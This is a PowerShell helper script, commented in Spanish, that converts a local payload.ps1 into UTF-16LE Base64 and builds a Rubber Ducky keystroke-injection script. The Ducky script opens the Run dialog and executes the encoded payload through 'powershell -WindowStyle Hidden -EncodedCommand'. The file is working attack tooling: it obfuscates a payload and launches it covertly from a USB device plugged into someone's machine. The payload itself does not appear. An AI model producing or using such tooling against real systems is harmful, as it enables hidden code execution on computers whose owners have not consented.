# ============================================================
# Genera el Base64 UTF-16LE para -EncodedCommand y verifica
# ============================================================

$ErrorActionPreference = "Stop"

$ps1Path = ".\payload.ps1"
$outPath = ".\payload.b64.txt"

if (-not (Test-Path $ps1Path)) {
    Write-Host "[-] No existe $ps1Path" -ForegroundColor Red
    exit 1
}

# Leer script
$script = Get-Content -Raw -Path $ps1Path

# Codificar UTF-16LE -> Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$b64   = [Convert]::ToBase64String($bytes)

# Guardar Base64 (una sola línea)
[IO.File]::WriteAllText($outPath, $b64)
Write-Host "[+] Base64 generado: $outPath" -ForegroundColor Green
Write-Host "[+] Longitud: $($b64.Length) caracteres" -ForegroundColor Cyan

# Verificación: decodificar y comparar
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
if ($decoded -eq $script) {
    Write-Host "[+] Verificacion OK: el Base64 decodifica exactamente al script original." -ForegroundColor Green
} else {
    Write-Host "[-] Verificacion FALLIDA. Algo no cuadra." -ForegroundColor Red
    # Guardar el decodificado para inspeccion
    [IO.File]::WriteAllText(".\_decoded_check.ps1", $decoded)
    exit 1
}

# Generar el Ducky Script listo para pegar
$ducky = @"
DELAY 2000
GUI r
DELAY 800
STRING powershell -WindowStyle Hidden -EncodedCommand $b64
ENTER
"@
[IO.File]::WriteAllText(".\payload_ducky.txt", $ducky)
Write-Host "[+] Ducky Script generado: payload_ducky.txt" -ForegroundColor Green
Write-Host ""
Write-Host "Resumen:" -ForegroundColor Yellow
Write-Host "  Script PS1 : $ps1Path ($($script.Length) chars)"
Write-Host "  Base64     : $outPath ($($b64.Length) chars)"
Write-Host "  Ducky      : payload_ducky.txt"